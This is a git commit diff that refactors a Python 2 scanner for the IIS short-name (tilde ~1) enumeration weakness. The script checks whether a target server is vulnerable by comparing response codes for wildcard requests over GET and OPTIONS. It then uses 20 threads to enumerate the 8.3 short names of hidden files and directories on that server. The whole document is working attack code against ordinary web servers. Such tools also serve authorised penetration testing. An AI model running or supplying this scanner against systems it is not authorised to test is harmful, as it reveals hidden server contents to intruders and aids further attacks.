4ad49372e73b0473597c988c4095e81935ffe549
lijiejie <my@lijiejie.com>
2016-10-27 19:15:05 +0800

    code reconstruction,bug fixed

--- iis_shortname_Scan.py
+++ iis_shortname_Scan.py
@@ -1,31 +1,36 @@
-# encoding=gbk
+#!/usr/bin/env python
+# encoding:utf-8
 # An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com    
+
 
 import sys
 import httplib
 import urlparse
-import string
 import threading
 import Queue
 import time
-import string
 
 
 class Scanner():
     def __init__(self, target):
-        self.target = target
+        self.target = target.lower()
+        if not self.target.startswith('http'):
+            self.target = 'http://%s' % self.target
         self.scheme, self.netloc, self.path, params, query, fragment = \
                      urlparse.urlparse(target)
         if self.path[-1:] != '/':    # ends with slash
             self.path += '/'
-        self.payloads = list('abcdefghijklmnopqrstuvwxyz0123456789_-')
+        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
         self.files = []
         self.dirs = []
         self.queue = Queue.Queue()
         self.lock = threading.Lock()
         self.threads = []
+        self.request_method = ''
+        self.msg_queue = Queue.Queue()
+        self.STOP_ME = False
+        threading.Thread(target=self._print).start()
 
-    
     def _conn(self):
         try:
             if self.scheme == 'https':
@@ -34,108 +39,106 @@ class Scanner():
                 conn = httplib.HTTPConnection(self.netloc)
             return conn
         except Exception, e:
-            print '[Exception in function _conn]', e
+            print '[_conn.Exception]', e
             return None
 
-    # fetch http response status code
     def _get_status(self, path):
         try:
             conn = self._conn()
-            conn.request('GET', path)
+            conn.request(self.request_method, path)
             status = conn.getresponse().status
             conn.close()
             return status
         except Exception, e:
-            raise Exception('[Exception in function _get_status] %s' % str(e) )
+            raise Exception('[_get_status.Exception] %s' % str(e) )
 
-    # test weather the server is vulerable
     def is_vul(self):
         try:
-            status_1 = self._get_status(self.path + '/*~1****/a.aspx')    # an existed file/folder
-            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')    # not existed file/folder
-            if status_1 == 404 and status_2 == 400:
-                return True
-            return False
+            for _method in ['GET', 'OPTIONS']:
+                self.request_method = _method
+                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
+                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
+                if status_1 == 404 and status_2 != 404:
+                    return True
+            return  False
         except Exception, e:
-            raise Exception('[Exception in function is_val] %s' % str(e) )
+            raise Exception('[is_vul.Exception] %s' % str(e) )
 
     def run(self):
-        # start from root path
-        for payload in self.payloads:
-            self.queue.put( (self.path + payload, '****') )    # filename, extention
-        for i in range(10):  
+        for c in self.alphanum:
+            self.queue.put( (self.path + c, '.*') )    # filename, extension
+        for i in range(20):
             t = threading.Thread(target=self._scan_worker)
             self.threads.append(t)
             t.start()
-
-    def report(self):
         for t in self.threads:
             t.join()
-        self._print('-'* 64)
-        for d in self.dirs:
-            self._print('Dir:  ' + d)
-        for f in self.files:
-            self._print('File: ' + f)
-        self._print('-'*64)
-        self._print('%d Directories, %d Files found in toal' % (len(self.dirs), len(self.files)) )
-        
+        self.STOP_ME = True
 
-    def _print(self, msg):
-        self.lock.acquire()
-        print msg
-        self.lock.release()
+    def report(self):
+        print '-'* 64
+        for d in self.dirs:
+            print 'Dir:  %s' % d
+        for f in self.files:
+            print 'File: %s' % f
+        print '-'*64
+        print '%d Directories, %d Files found in total' % (len(self.dirs), len(self.files))
+        print 'Note that * is a wildcard, matches any character zero or more times.'
+
+    def _print(self):
+        while not self.STOP_ME or (not self.msg_queue.empty()):
+            if self.msg_queue.empty():
+                time.sleep(0.05)
+            else:
+                print self.msg_queue.get()
 
     def _scan_worker(self):
         while True:
             try:
-                url, ext = self.queue.get(timeout=3)
+                url, ext = self.queue.get(timeout=1.0)
                 status = self._get_status(url + '*~1' + ext + '/1.aspx')
                 if status == 404:
-                    self._print('Found ' +  url + ext + '\t[scan in progress]')
+                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))
 
                     if len(url) - len(self.path)< 6:    # enum first 6 chars only
-                        for payload in self.payloads:
-                            self.queue.put( (url + payload, ext) )
+                        for c in self.alphanum:
+                            self.queue.put( (url + c, ext) )
                     else:
-                        if ext == '****':    # begin to scan extention
-                            for payload in string.ascii_lowercase:
-                                self.queue.put( (url, '*' + payload + '**') )
-                            self.queue.put( (url,'') )    # also it can be a folder
-                        elif ext.count('*') == 3:
-                            for payload in string.ascii_lowercase:
-                                self.queue.put( (url, '*' + ext[1] + payload + '*') )
-                        elif ext.count('*') == 2:
-                            for payload in string.ascii_lowercase:
-                                self.queue.put( (url, '*' + ext[1] + ext[2] + payload ) )
-                        elif ext == '':
+                        if ext == '.*':
+                            self.queue.put( (url, '') )
+
+                        if ext == '':
                             self.dirs.append(url + '~1')
-                            self._print('Found Dir ' +  url + '~1\t[Done]')
+                            self.msg_queue.put('[+] Directory ' +  url + '~1\t[Done]')
 
-                        elif ext.count('*') == 1:
-                            self.files.append(url + '~1.' + ext[1:])
-                            self._print('Found File ' + url + '~1.' + ext[1:] + '\t[Done]')
-            except Exception,e:
+                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
+                            self.files.append(url + '~1' + ext)
+                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')
+
+                        else:
+                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
+                                self.queue.put( (url, ext[:-1] + c + '*') )
+                                if len(ext) < 4:    # < len('.as*')
+                                    self.queue.put( (url, ext[:-1] + c) )
+
+            except Queue.Empty,e:
                 break
-            
+            except Exception, e:
+                print '[Exception]', e
 
 
-if len(sys.argv) == 1:
-    print 'Usage: %s target' % sys.argv[0]
-    sys.exit()
+if __name__ == '__main__':
+    if len(sys.argv) == 1:
+        print 'Usage: python IIS_shortname_Scan.py http://www.target.com/'
+        sys.exit()
 
-target = sys.argv[1]
-s = Scanner(target)
-if not s.is_vul():
-    print 'Sorry, server is not vulerable'
-    sys.exit(0)
+    target = sys.argv[1]
+    s = Scanner(target)
+    if not s.is_vul():
+        s.STOP_ME = True
+        print 'Server is not vulnerable'
+        sys.exit(0)
 
-print 'server is vulerable, please wait, scanning...'
-s.run()
-s.report()
-
-
-
-    
-
-
-
+    print 'Server is vulnerable, please wait, scanning...'
+    s.run()
+    s.report()
